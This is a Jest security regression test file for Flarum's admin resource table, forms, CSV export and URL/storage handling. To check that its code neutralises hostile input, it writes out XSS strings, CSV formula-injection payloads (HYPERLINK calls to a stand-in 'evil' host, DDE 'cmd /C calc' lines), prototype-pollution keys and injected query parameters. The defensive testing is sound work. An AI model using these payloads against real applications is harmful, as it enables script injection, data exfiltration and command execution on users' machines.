/**
 * Security regression guards for the admin resource UI (PR flarum/framework#5324).
 *
 * Each test feeds hostile input (markup, formula payloads, prototype keys, injected request
 * parameters, corrupted storage) through the real code path and asserts nothing is interpreted.
 */
import { jest } from '@jest/globals';
import mq from 'mithril-query';
import { app } from '../../src/admin';
import ResourceTable from '../../src/admin/components/resource/ResourceTable';
import ResourceFormModal from '../../src/admin/components/resource/ResourceFormModal';
import BulkResultModal from '../../src/admin/components/resource/BulkResultModal';
import ResourceActionModal from '../../src/admin/components/resource/ResourceActionModal';
import RequestError from '../../src/common/utils/RequestError';
import Model from '../../src/common/Model';
import { clearDescriptorCache } from '../../src/common/resource/descriptor';
import ResourceDefinition from '../../src/common/resource/ResourceDefinition';
import ResourceListState from '../../src/common/resource/ResourceListState';
import ColumnPreferences from '../../src/common/resource/ColumnPreferences';
import ViewPreferences from '../../src/common/resource/ViewPreferences';
import LiveValidator, { resetLiveValidation } from '../../src/common/resource/liveValidation';
import { csvCell, exportCsv, toCsv } from '../../src/common/resource/csv';
import { deleteAction, executeAction, needsConfirmation } from '../../src/common/resource/actions';
import { bootAdmin, descriptor, fd, modalClass, schemaDocument } from '../unit/common/resource/fixtures';

class Thing extends Model {}

const XSS = '<img src=x onerror="window.__pwned=1"><script>window.__pwned=1</script>';

const things = descriptor(
  [
    fd('name', 'string', {
      sortable: true,
      label: `Name ${XSS}`,
      constraints: { maxLength: 3, messages: { maxLength: `msg ${XSS}` } },
      ui: { help: `help ${XSS}`, placeholder: `ph ${XSS}` } as any,
    }),
    fd('status', 'string', { enum: ['draft', 'live'], enumLabels: { draft: `Draft ${XSS}`, live: 'Live' } } as any),
    fd('notes', 'string'),
    fd('owner', 'toOne' as any),
  ],
  {
    sorts: ['name'],
    filters: [
      { key: 'status', kind: 'enum', enum: ['draft', 'live'], label: `Status ${XSS}`, enumLabels: { draft: `D ${XSS}` } } as any,
      { key: 'flag', kind: 'boolean', negatable: true } as any,
    ],
    rowAbilities: { edit: 'canEdit', delete: 'canDelete' },
  }
);

const flush = () => new Promise((resolve) => setTimeout(resolve, 0));

function thing(id: string, attributes: Record<string, unknown> = {}): Thing {
  return app.store.pushObject<Thing>({ type: 'things', id, attributes: { name: `Thing ${id}`, ...attributes } } as any)!;
}

function results(models: Model[], meta: Record<string, unknown> = {}) {
  return Object.assign([...models], { payload: { data: [], meta, links: {} } });
}

function modalAttrs(extra: Record<string, unknown>) {
  return { state: {}, animateShow: (cb: () => void) => cb(), animateHide: jest.fn(), ...extra };
}

/** Walk a rendered DOM for any injected element or event-handler attribute. */
function assertNoInjection(root: Element | Document = document) {
  const el = 'querySelectorAll' in root ? root : document;
  expect(el.querySelectorAll('img[src="x"], script').length).toBe(0);
  el.querySelectorAll('*').forEach((node) => {
    [...node.attributes].forEach((attr) => expect(attr.name.toLowerCase().startsWith('on') && attr.value.includes('__pwned')).toBe(false));
  });
  expect((window as any).__pwned).toBeUndefined();
}

function mqRoot(out: any): Element {
  return out.rootEl as Element;
}

describe('resource UI security', () => {
  let find: jest.Mock<any>;

  beforeAll(() => {
    bootAdmin();
    app.store.models.things = Thing;
  });

  beforeEach(async () => {
    clearDescriptorCache();
    resetLiveValidation();
    window.history.replaceState(null, '', '/admin#/things');
    app.request = jest.fn(() => Promise.resolve(schemaDocument(things))) as any;
    await new ResourceDefinition('things').load();
    find = jest.fn(() =>
      Promise.resolve(
        results([
          thing('1', { name: XSS, status: 'draft', notes: `=HYPERLINK("http://evil/"&A1)`, canEdit: true, canDelete: true }),
          thing('2', { name: 'ok', canEdit: true, canDelete: false }),
        ])
      )
    );
    jest.spyOn(app.store, 'find').mockImplementation(find as any);
    app.modal.show = jest.fn() as any;
    ColumnPreferences.clear();
    ViewPreferences.clear();
    window.localStorage.clear();
    delete (window as any).__pwned;
  });

  afterEach(() => jest.restoreAllMocks());

  async function table() {
    const out = mq(ResourceTable, { definition: new ResourceDefinition<Thing>('things') });
    await flush();
    await flush();
    out.redraw();
    return out;
  }

  // ---------------------------------------------------------------- XSS

  describe('XSS', () => {
    test('record values, labels, enum labels, URL filter values and ?q= render as text', async () => {
      window.history.replaceState(null, '', `/admin#/things?q=${encodeURIComponent(XSS)}&filter[status]=${encodeURIComponent(XSS)}`);
      const out = await table();

      expect(mqRoot(out).textContent).toContain('<img src=x onerror=');
      expect(out).not.toHaveElement('img[src=x]');
      expect(out).not.toHaveElement('script');
      assertNoInjection(mqRoot(out));
    });

    test('BulkResultModal renders JSON:API error details and record labels as text', () => {
      const error = new RequestError(422, '', {}, {} as any);
      error.response = { errors: [{ status: '422', detail: XSS }] } as any;
      const model = thing('9', { name: XSS });
      const out = mq(BulkResultModal, modalAttrs({ summary: { ok: [], failed: [{ model, error }], skipped: [thing('8', { name: XSS })] } }));

      expect(mqRoot(out).textContent).toContain('<img src=x onerror=');
      expect(out).not.toHaveElement('img[src=x]');
      assertNoInjection(mqRoot(out));
    });

    test('form labels, help, placeholder, custom messages and server errors render as text', async () => {
      const oninit = jest.spyOn(ResourceFormModal.prototype as any, 'oninit');
      const out = mq(ResourceFormModal, modalAttrs({ definition: new ResourceDefinition<Thing>('things'), model: null }));
      const modal = oninit.mock.contexts[0] as any;
      oninit.mockRestore();
      await flush();
      await flush();

      modal.formState.stream('name')('too long');
      modal.formState.validate();
      modal.formState.setServerError('notes', `server ${XSS}`);
      out.redraw();

      expect(out).not.toHaveElement('img[src=x]');
      expect(out).not.toHaveElement('script');
      assertNoInjection(mqRoot(out));
    });

    test('ResourceActionModal confirmation with record labels renders as text', () => {
      const model = thing('7', { name: XSS, canDelete: true });
      const out = mq(
        ResourceActionModal,
        modalAttrs({
          definition: new ResourceDefinition<Thing>('things'),
          action: deleteAction<Thing>('canDelete', 'bulk'),
          models: [model],
          context: {},
          ondone: () => {},
        })
      );

      expect(out).not.toHaveElement('img[src=x]');
      assertNoInjection(mqRoot(out));
    });

    test('translator does not parse markup inside interpolated values', () => {
      app.translator.addTranslations({ 'sec.test': 'Hello <b>{name}</b>' });
      const out = mq({ view: () => <div>{app.translator.trans('sec.test', { name: XSS })}</div> } as any);

      expect(out).toHaveElement('b');
      expect(out).not.toHaveElement('img');
      expect(out).not.toHaveElement('script');
    });
  });

  // ---------------------------------------------------------------- CSV

  describe('CSV export', () => {
    test.each([
      ['=1+1', `"'=1+1"`],
      ['+1', `"'+1"`],
      ['-1+cmd|" /C calc"!A0', `"'-1+cmd|"" /C calc""!A0"`],
      ['@SUM(A1)', `"'@SUM(A1)"`],
      ['\t=1', `"'\t=1"`],
      ['\r=1', `"'\r=1"`],
      [' =1+1', `"' =1+1"`],
      ['\n@SUM(A1)', `"'\n@SUM(A1)"`],
      ['=HYPERLINK("http://evil/")', `"'=HYPERLINK(""http://evil/"")"`],
      ['a,b', '"a,b"'],
      ['line1\nline2', '"line1\nline2"'],
      ['"q"', '"""q"""'],
      ['Zoë 😀', '"Zoë 😀"'],
      [-5, `"'-5"`],
    ])('csvCell(%j) => %j', (input, expected) => {
      expect(csvCell(input)).toBe(expected);
    });

    test('vnodes are never stringified into a cell; objects are JSON', () => {
      expect(csvCell({ tag: 'img', attrs: { src: 'x' } })).toBe('""');
      expect(csvCell(['=1'])).toBe('"[""=1""]"');
    });

    test('a comma-split payload stays inside one quoted cell', () => {
      expect(csvCell('x,=1+1')).toBe('"x,=1+1"');
    });

    // Excel in locales whose list separator is ";" (de, fr, nl, ...) splits an unquoted CSV field on
    // ";", so "x;=HYPERLINK(...)" becomes a second cell that starts with "=" and is evaluated.
    test.each([
      ['Laptop;=HYPERLINK("http://evil/?"&A1;"click")'],
      ['x;@SUM(1+1)*cmd|"/C calc"!A0'],
      ["x;=cmd|' /C calc'!A0"],
      ['x;=1+1'],
      ['x;+1'],
      ['x;-1+1'],
    ])('a ";"-separated formula payload %j stays inside one quoted cell', (input) => {
      expect(csvCell(input)).toBe(`"${input.replace(/"/g, '""')}"`);
    });

    test('header cells are quoted and guarded too', () => {
      expect(toCsv([], ['=evil'])).toBe(`"'=evil"\r\n`);
    });

    test('export: BOM, guarded cells, hidden/relationship/rendered-only columns left out, no extra params', async () => {
      let blob: Blob | null = null;
      (URL as any).createObjectURL = jest.fn((b: Blob) => ((blob = b), 'blob:x'));
      (URL as any).revokeObjectURL = jest.fn();
      jest.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});

      const state = new ResourceListState<Thing>(new ResourceDefinition<Thing>('things'), { syncUrl: false });
      await state.load();

      await exportCsv(state, {
        columns: [
          ['name', { name: 'Name' }],
          ['notes', { name: 'Notes' }],
          ['owner', { name: 'Owner' }],
          ['status', { name: 'Status', hidden: true }],
          ['rendered', { name: 'Rendered' }],
        ],
      });

      const text = await new Promise<string>((resolve) => {
        const reader = new FileReader();
        reader.onload = () => resolve(new TextDecoder('utf-8', { ignoreBOM: true }).decode(reader.result as ArrayBuffer));
        reader.readAsArrayBuffer(blob as unknown as Blob);
      });
      expect(text.charCodeAt(0)).toBe(0xfeff);
      const lines = text.slice(1).split('\r\n');
      expect(lines[0]).toBe('"Name","Notes"');
      expect(lines[1]).toContain(`"'=HYPERLINK(""http://evil/""&A1)"`);
      expect(text).not.toContain('Owner');
      expect(text).not.toContain('Status');

      const params = (find.mock.calls.at(-1) as any)[1];
      expect(Object.keys(params).sort()).toEqual(['page']);
      expect(params.page.limit).toBe(50);
    });
  });

  // ---------------------------------------------------------------- URL / storage injection

  describe('URL and stored-view injection', () => {
    test('hostile query string cannot add request params, unknown filters, foreign sorts or pollute prototypes', async () => {
      const qs = [
        'sort=-password',
        'include=groups,tokens',
        'fields[things]=password',
        'filter[include]=groups',
        'filter[email]=admin@x',
        'filter[__proto__][polluted]=1',
        'filter[constructor]=1',
        'filter[-__proto__]=1',
        'filter[-constructor]=1',
        'filter[toString]=1',
        'filter[status]=draft',
        'page=-9',
        'q=hello',
      ].join('&');
      window.history.replaceState(null, '', `/admin#/things?${qs}`);

      const state = new ResourceListState<Thing>(new ResourceDefinition<Thing>('things'));
      await state.load();

      const params = (find.mock.calls.at(-1) as any)[1];
      expect(params.sort).toBeUndefined();
      expect(params.include).toBeUndefined();
      expect(params.fields).toBeUndefined();
      expect(Object.keys(params.filter).sort()).toEqual(['q', 'status']);
      expect(params.page.offset).toBe(0);
      expect(({} as any).polluted).toBeUndefined();
      expect(Object.prototype.hasOwnProperty.call(Object.prototype, 'polluted')).toBe(false);
    });

    test('an unknown sort cannot be set programmatically', async () => {
      const state = new ResourceListState<Thing>(new ResourceDefinition<Thing>('things'), { syncUrl: false });
      await state.load();
      await state.setSort('password');
      expect(state.listParams().sort).toBeUndefined();
    });

    test.each([
      ['{'],
      ['null'],
      ['[]'],
      ['"str"'],
      ['42'],
      ['{"sort":{"x":1},"filter":[1,2]}'],
      ['{"sort":"-password","filter":{"__proto__":{"polluted":"1"},"constructor":"x","include":"groups","status":"draft,evil"}}'],
    ])('hostile saved view %s neither throws nor injects', async (raw) => {
      window.localStorage.setItem('flarum.resourceTable.things.view', raw);
      window.localStorage.setItem('flarum.resourceTable.things.columns', raw);

      const out = await table();
      expect(out).toHaveElement('table');

      const params = (find.mock.calls.at(-1) as any)[1];
      expect(params.sort).toBeUndefined();
      expect(params.include).toBeUndefined();
      Object.keys(params.filter ?? {}).forEach((key) => expect(['status']).toContain(key));
      if (params.filter?.status) expect(params.filter.status).toBe('draft');
      expect(({} as any).polluted).toBeUndefined();
    });

    test('ColumnPreferences ignores __proto__ / non-boolean entries', () => {
      window.localStorage.setItem('flarum.resourceTable.things.columns', '{"__proto__":{"hidden":true},"name":"yes","notes":false}');
      const prefs = ColumnPreferences.load('things');
      expect([...prefs.entries()]).toEqual([['notes', false]]);
      expect(({} as any).hidden).toBeUndefined();
    });
  });

  // ---------------------------------------------------------------- Live validation

  describe('live validation', () => {
    const live = descriptor([fd('name', 'string', { ui: { liveValidate: true } as any }), fd('secret', 'string')], { endpoint: '/things' });

    async function form(model: Thing | null) {
      jest.restoreAllMocks();
      app.request = jest.fn(() => Promise.resolve(schemaDocument(live))) as any;
      clearDescriptorCache();
      await new ResourceDefinition('things').load();
      const oninit = jest.spyOn(ResourceFormModal.prototype as any, 'oninit');
      const out = mq(ResourceFormModal, modalAttrs({ definition: new ResourceDefinition<Thing>('things'), model }));
      const modal = oninit.mock.contexts[0] as any;
      oninit.mockRestore();
      await flush();
      await flush();
      out.redraw();
      return { out, modal };
    }

    test('sends only the one field, same-origin, and renders a hostile 422 detail as text', async () => {
      const { out, modal } = await form(null);
      modal.formState.stream('name')('n');
      modal.formState.stream('secret')('do-not-send');

      const error = new RequestError(422, '', {}, {} as any);
      error.response = { errors: [{ status: '422', detail: XSS, source: { pointer: '/data/attributes/name' } }] } as any;
      const request = jest.fn(() => Promise.reject(error));
      app.request = request as any;

      await new LiveValidator(modal.formState).validate('name');
      out.redraw();

      const opts = (request.mock.calls[0] as any)[0];
      expect(opts.url).toBe('https://example.test/api/things');
      expect(Object.keys(opts.body.data.attributes)).toEqual(['name']);
      expect(opts.headers['Precognition-Validate-Only']).toBe('name');
      expect(out).not.toHaveElement('img[src=x]');
      assertNoInjection(mqRoot(out));
    });

    test('a hostile non-JSON:API error body is ignored without throwing', async () => {
      const { modal } = await form(null);
      modal.formState.stream('name')('n');
      const error = new RequestError(422, '<html>', {}, {} as any);
      (error as any).response = { errors: 'not-an-array' };
      app.request = jest.fn(() => Promise.reject(error)) as any;

      await expect(new LiveValidator(modal.formState).validate('name')).resolves.toBeUndefined();
    });
  });

  // ---------------------------------------------------------------- Destructive actions

  describe('destructive actions', () => {
    test('built-in delete always needs confirmation', () => {
      expect(needsConfirmation(deleteAction('canDelete'))).toBe(true);
      expect(needsConfirmation(deleteAction('canDelete', 'bulk'))).toBe(true);
    });

    test('bulk delete opens the confirmation modal; nothing is deleted before', async () => {
      class DeleteDefinition extends ResourceDefinition<Thing> {
        resourceActions() {
          const items = super.resourceActions();
          items.setContent('delete', { ...items.get('delete'), scope: 'both' });
          return items;
        }
      }
      const out = mq(ResourceTable, { definition: new DeleteDefinition('things') });
      await flush();
      await flush();
      out.redraw();
      const request = jest.fn(() => Promise.resolve());
      app.request = request as any;

      out.first('tr[data-id="1"] input.ResourceTable-select').checked = true;
      out.trigger('tr[data-id="1"] input.ResourceTable-select', 'change');
      // A crafted attempt to tick the disabled (canDelete:false) row.
      expect(out).toHaveElement('tr[data-id="2"] input.ResourceTable-select[disabled]');
      out.click('.ResourceTable-batchBar .ResourceTable-bulkDelete');
      await flush();

      expect(await modalClass((app.modal.show as jest.Mock<any>).mock.calls.at(-1)![0])).toBe(ResourceActionModal);
      expect(app.modal.show).toHaveBeenCalledWith(expect.any(Function), expect.anything());
      expect(request).not.toHaveBeenCalled();
    });

    test('a crafted selection of a non-deletable or off-page id is never deleted', async () => {
      const definition = new ResourceDefinition<Thing>('things');
      const state = new ResourceListState<Thing>(definition, { syncUrl: false });
      await state.load();
      const hidden = thing('99', { canDelete: true });
      state.selection.ids.add('2'); // canDelete: false
      state.selection.ids.add('99'); // not on the page

      const ran: string[] = [];
      const runner = { run: async (models: Thing[], op: any) => (models.forEach((mm) => ran.push(mm.id()!)), { ok: [], failed: [] }) };
      const action = deleteAction<Thing>('canDelete', 'bulk');
      const selected = state.selectedModels();
      const applicable = selected.filter((mm) => action.applies!(mm));

      await executeAction(action, applicable, [], {}, { list: state, runner, showResult: () => {} } as any);

      expect(selected.map((mm) => mm.id())).toEqual(['2']);
      expect(ran).toEqual([]);
      expect(hidden.id()).toBe('99');
    });

    test('double-run guard: a second run over the same records reuses the first', async () => {
      const state = new ResourceListState<Thing>(new ResourceDefinition<Thing>('things'), { syncUrl: false });
      await state.load();
      let calls = 0;
      let release!: () => void;
      const runner = { run: async () => (calls++, await new Promise<void>((r) => (release = r)), { ok: [], failed: [] }) };
      const action = deleteAction<Thing>('canDelete', 'bulk');
      const model = state.getItems()[0];
      const ctx = { list: state, runner, showResult: () => {} } as any;

      const a = executeAction(action, [model], [], {}, ctx);
      const b = executeAction(action, [model], [], {}, ctx);
      await flush();
      release();
      await Promise.all([a, b]);

      expect(calls).toBe(1);
    });
  });
});
